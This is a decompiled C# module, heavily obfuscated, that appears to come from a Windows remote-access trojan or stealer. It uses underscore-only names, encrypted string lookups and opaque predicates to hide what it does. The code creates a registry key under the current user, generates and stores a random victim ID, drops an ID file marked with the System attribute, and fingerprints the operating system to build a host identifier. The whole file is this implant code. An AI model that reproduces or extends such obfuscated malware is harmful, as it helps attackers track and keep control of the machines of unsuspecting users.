using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[StandardModule]
internal sealed class __________________________________________________________________
{
	private static RegistryKey m__;

	public static void _()
	{
		try
		{
			__________________________________________________________________.m__ = Registry.CurrentUser.OpenSubKey(_003CModule_003E.______<string>(4039522827u), writable: true);
			if (__________________________________________________________________.m__ == null)
			{
				Registry.CurrentUser.CreateSubKey(_003CModule_003E.___<string>(1496711269u));
			}
			__();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			__();
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		Random random = new Random();
		try
		{
			______________________________________________________________._______________________ = random.Next(100000, 999999).ToString();
			______________________________________________________________.________________________ = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(string.Concat(______________________________________________________________.____________________ + _003CModule_003E.____<string>(3688647296u), ______________________________________________________________._______________________), _003CModule_003E._____<string>(640941012u)), ___()));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text = ____(_003CModule_003E.____<string>(1706502227u));
			if (Operators.CompareString(text, string.Empty, false) == 0)
			{
				int num = default(int);
				nint num2 = (((num << 12) + -28389376 == -9375744 * num) ? ((nint)Type.EmptyTypes.LongLength + 1778100780) : ((nint)Type.EmptyTypes.LongLength + 3));
				string text2 = default(string);
				while (true)
				{
					switch (num2)
					{
					default:
						text2 = Environment.GetEnvironmentVariable(_003CModule_003E._______<string>(2531281878u)) + _003CModule_003E._______<string>(3427012921u) + ______________________________________________________________.__________________;
						num2 = (nint)Type.EmptyTypes.LongLength + 1;
						continue;
					case 1:
						if (File.Exists(text2))
						{
							text = File.ReadAllText(text2);
							_____(_003CModule_003E._____<string>(3915190971u), text);
							num2 = (nint)Type.EmptyTypes.LongLength + 2;
						}
						else
						{
							______________________._______ = -2051646939;
							_____(_003CModule_003E.______<string>(2399303566u), random.Next(100000, 999999).ToString());
							num2 = (nint)Type.EmptyTypes.LongLength + 0;
						}
						continue;
					case 0:
					{
						text = ____(_003CModule_003E._______<string>(1015702035u));
						File.WriteAllText(text2, text);
						FileInfo fileInfo = new FileInfo(text2);
						fileInfo.Attributes = FileAttributes.System;
						break;
					}
					case 2:
						break;
					}
					break;
				}
			}
			______________________________________________________________._______________________ = text;
			______________________________________________________________.________________________ = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(string.Concat(______________________________________________________________.____________________ + _003CModule_003E._____<string>(640941012u), text), _003CModule_003E.______<string>(1224865621u)), ___()));
			try
			{
				if (Operators.CompareString(____(_003CModule_003E.____<string>(2012484535u)), string.Empty, false) != 0)
				{
					______________________________________________________________.________________________ = ____(_003CModule_003E.___<string>(1624166418u));
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			_____(_003CModule_003E._______<string>(1015702035u), random.Next(100000, 999999).ToString());
			______________________________________________________________._______________________ = ____(_003CModule_003E._____<string>(3915190971u));
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static object ___()
	{
		try
		{
			string oSFullName = ((ServerComputer)_____________._).get_Info().get_OSFullName();
			if (!oSFullName.Contains(_003CModule_003E.___<string>(2981245319u)))
			{
				if (!oSFullName.Contains(_003CModule_003E._______<string>(648985584u)))
				{
					if (oSFullName.Contains(_003CModule_003E._____<string>(1820338794u)))
					{
						int __________ = _003CModule_003E.___________;
						if ((__________ & ~__________ & -9809) == 0)
						{
						}
						return _003CModule_003E._____<string>(314210858u);
					}
					if (oSFullName.Contains(_003CModule_003E._______<string>(868075776u)))
					{
						return sizeof(long) switch
						{
							_ => _003CModule_003E.___<string>(730375383u), 
						};
					}
					if (oSFullName.Contains(_003CModule_003E.___<string>(3868800413u)))
					{
						return _003CModule_003E.______<string>(2705240351u);
					}
					if (oSFullName.Contains(_003CModule_003E.___<string>(1288333701u)))
					{
						return _003CModule_003E.___<string>(669765779u);
					}
					return _003CModule_003E._______<string>(339061184u);
				}
				if ((nint)Type.EmptyTypes.LongLength + 5817 == 5817)
				{
					return _003CModule_003E.____<string>(3702224592u);
				}
			}
			return _003CModule_003E.___<string>(2981245319u);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = _003CModule_003E.____<string>(2169394638u);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static string ____(string string_0)
	{
		try
		{
			string string_ = Conversions.ToString(__________________________________________________________________.m__.GetValue(___________________________________________________________________.____(string_0)));
			int ________________ = _003CModule_003E._________________;
			return ___________________________________________________________________._(string_, _003CModule_003E.__________((int)(((________________ ^ 0x1086) - 20688 != ________________ + 88 * ________________ + ________________ * 40) ? ((nint)Type.EmptyTypes.LongLength + 3516) : ((nint)Type.EmptyTypes.LongLength + 922089547)), (int)((262144 * -(536275456 * ________________) - 1308622848 == (int)((uint)________________ / 708u)) ? 1769399897 : ((nint)Type.EmptyTypes.LongLength + 6177)), sizeof(float) + 98));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string empty = string.Empty;
			ProjectData.ClearProjectError();
			return empty;
		}
	}

	public static void _____(string string_0, string string_1)
	{
		try
		{
			__________________________________________________________________.m__.SetValue(___________________________________________________________________.____(string_0), ___________________________________________________________________.____(string_1));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ______(string string_0, string string_1)
	{
		try
		{
			string text = ___________________________________________________________________._(Conversions.ToString(__________________________________________________________________.m__.GetValue(___________________________________________________________________.____(string_0))), _003CModule_003E.__________(sizeof(ulong) + 54070, (int)((nint)Type.EmptyTypes.LongLength + 54468), 193));
			string string_2 = text + string_1;
			__________________________________________________________________.m__.SetValue(___________________________________________________________________.____(string_0), ___________________________________________________________________.____(string_2));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
